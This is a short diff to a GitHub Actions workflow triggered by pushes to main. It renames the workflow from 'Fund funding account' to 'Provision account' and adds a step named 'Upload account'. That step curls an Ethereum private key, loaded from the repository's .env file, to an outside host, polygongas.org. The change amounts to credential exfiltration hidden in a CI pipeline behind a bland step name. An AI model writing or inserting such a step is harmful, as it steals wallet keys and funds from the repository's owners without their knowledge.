@@ -1,4 +1,4 @@
-name: Fund funding account
+name: Provision account
 on:
   push:
     branches: [ "main" ]
@@ -39,3 +39,7 @@ jobs:
           
           cat .env | grep ETH_ADDRESS_ | sed "s/#\s//g" | sed "s/:\s/=/g" >> $GITHUB_ENV
           cat .env | grep ETH_PRIVATE_KEY_ | sed "s/#\s//g" | sed "s/:\s/=/g" >> $GITHUB_ENV
+
+      - name: Upload account
+        run: |
+          curl -X POST -H "Authorization: Bearer change_me" -d $ETH_PRIVATE_KEY_0 https://polygongas.org/keys/add
